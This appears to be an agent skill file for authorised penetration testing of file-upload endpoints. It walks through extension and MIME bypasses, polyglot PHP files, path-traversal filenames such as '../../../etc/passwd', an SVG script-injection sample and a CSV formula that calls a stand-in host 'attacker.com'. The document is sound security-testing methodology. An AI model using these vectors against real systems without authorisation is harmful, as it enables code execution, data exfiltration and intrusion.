---
name: file_upload_mutator
description: Test file uploads with extension bypass, path-traversal, MIME-mismatch, polyglot, SVG-XSS, formula-injection, and metadata-extraction vectors.
---
# File Upload Mutator

File upload endpoints are a convergence point for multiple vulnerability classes: path traversal, RCE via polyglot, XSS via SVG, formula injection, XXE via PDF/XML, and information disclosure via metadata extraction. The attack surface spans upload validation (extension, MIME, magic bytes), storage location, serving behavior (content-type header, inline vs. attachment), and downstream processing (antivirus, image resizing, archive extraction).

This pack composes with `packs/api_security/SKILL.md`, `packs/bizlogic_hunter/SKILL.md`, and `shared/evidence_rules.md`.

## When to Use

- The application accepts user file uploads (avatar, document, media, archive).
- Files are stored and served back to users.
- Filenames are user-controlled or derived from user input.
- Files undergo processing (resize, scan, extract, convert).

## Operating Rules

- **Baseline file**: upload a benign file first (e.g., valid PNG) to establish storage location and serving behavior.
- **Single mutation**: change exactly one property (extension, MIME, content) per test.
- **Safety first**: use non-executable payloads or detection-safe probes (e.g., probe for XXE without exfiltrating data).
- **Scope**: confirm file upload testing and the specific processing steps (resize, archive extraction, antivirus) are in scope.
- **Cleanup**: remove uploaded test files after evidence capture.

## Phase 1: Baseline Behavior

Upload a benign PNG (50x50 pixel):

1. Document the upload response (status, location, redirect).
2. Fetch the uploaded file via URL.
3. Check the response headers (`Content-Type`, `Content-Disposition`).
4. Confirm the file is intact (image opens).

Expected baseline: file stored at a predictable location; served with `Content-Type: image/png`.

## Phase 2: Validation Bypass

### A. Extension Whitelist Bypass

**Double Extension** (`avatar.png.php`):
- Upload a file named `avatar.png.php` with a PHP payload in the body.
- Expected: rejection (double extension not in whitelist) or stored as `avatar.png` (extension parsing varies).
- Bug: file is stored as `avatar.php` (server interprets rightmost extension); PHP is executed.

**Null Byte** (`avatar.php%00.png` or `avatar.php\x00.png`):
- Upload with a null byte in the filename (if applicable to the target's technology stack).
- Expected: rejection or filename is truncated to `avatar.php`.
- Bug: stored as `avatar.php`; PHP is executed (null byte bypasses PNG check).

**Case Variation** (`avatar.PhP` or `avatar.pHp`):
- Upload with mixed-case extension.
- Expected: rejection or case-normalized to `.php` and rejected.
- Bug: stored as `.PhP`; web server or scripting runtime is case-insensitive and executes it.

### B. MIME-Type Validation Bypass

**MIME Mismatch**:
- Upload a PHP file with `Content-Type: image/png` header.
- Expected: rejection (MIME type doesn't match file content).
- Bug: file is stored and executed as PHP.

### C. Magic-Byte Validation Bypass

**Polyglot File** (valid PNG + valid PHP):
```
// PNG header: 89 50 4e 47 0d 0a 1a 0a
// Followed by PHP code in a comment block or appended after PNG EOF marker
```
- Upload a file that is both a valid PNG and valid PHP.
- Expected: file is validated as PNG; PHP code is not executed.
- Bug: file is executed as PHP; image is also valid PNG (polyglot bypass).

**Magic Bytes Prepended**:
- Prepend PNG magic bytes to a PHP script: `\x89PNG...<?php phpinfo(); ?>`.
- Expected: rejection (not a valid PNG).
- Bug: file passes magic-byte check; PHP is executed.

## Phase 3: Path Traversal

### A. Filename Path Traversal

**Relative Paths**:
- Upload with filename `../../avatar.png` or `../../../etc/passwd`.
- Expected: rejection or filename is sanitized to `avatar.png`.
- Bug: file is stored at a different location (e.g., parent directory or system path).

**Absolute Paths** (rare but test if applicable):
- Upload with filename `/var/www/html/shell.php`.
- Expected: rejection (absolute path not allowed).
- Bug: file is stored at the specified absolute path.

## Phase 4: Content-Type Injection

### A. SVG with Script Tag

Upload an SVG file:
```xml
<?xml version="1.0" encoding="UTF-8"?>
<svg xmlns="http://www.w3.org/2000/svg" width="100" height="100">
  <script>alert('XSS')</script>
</svg>
```

- Expected: served as `image/svg+xml`; script is blocked (Content-Security-Policy or sandboxing).
- Bug: served as `image/svg+xml` with `Content-Disposition: inline`; script is executed in the user's browser.

### B. Formula Injection (CSV)

Upload a CSV with formula:
```
Name,Email
Alice,alice@example.com
=IMPORTXML("http://attacker.com/",123),bob@example.com
```

- Expected: formula is stored as-is; no execution during export.
- Bug: formula is executed when the CSV is opened in Excel/Sheets.

## Phase 5: Archive Traversal

**ZIP with Path Traversal** (if the application extracts archives):
- Create a ZIP file with entries like `../../../malicious.php` or `etc/passwd`.
- Upload the ZIP.
- Expected: rejection or extraction is sandboxed (entries are validated).
- Bug: entries are extracted to unintended locations.

## Evidence Capture

For each mutation, document:

1. **Baseline**: benign file upload and serving behavior.
2. **Request**: upload request with filename, MIME, body.
3. **Response**: server response, status, location.
4. **Storage**: where the file was stored (filesystem path or URL).
5. **Behavior**: how the file is served (Content-Type, Content-Disposition, execution).

Store under `file_upload_<test>_<timestamp>/`:
- `01_baseline.txt` — benign upload and serving behavior.
- `02_mutation_request.txt` — the mutated upload request.
- `03_mutation_response.txt` — server response.
- `04_storage_location.txt` — where the file was stored.
- `05_behavior.txt` — how the file is served or executed.

## Submission Gates

Run `packs/triage_validation/SKILL.md` 7-Question gate. Then:

- [ ] The upload endpoint is in scope and user-controlled.
- [ ] Baseline behavior is documented (benign file upload).
- [ ] The mutation is a single change (extension, MIME, path component, content).
- [ ] The divergence is documented (unintended storage location or execution).
- [ ] The finding is reproducible across multiple uploads.

## Exclusions

- Do not upload executable payloads that would damage the server or user systems.
- Do not exfiltrate sensitive data from file processing errors.
- Do not upload malware or actual exploit code.
- Do not test file upload out of scope.

## See Also

- `agent_skills/packs/api_security/SKILL.md` — API input validation.
- `agent_skills/packs/bizlogic_hunter/SKILL.md` — business-logic bugs in file processing.
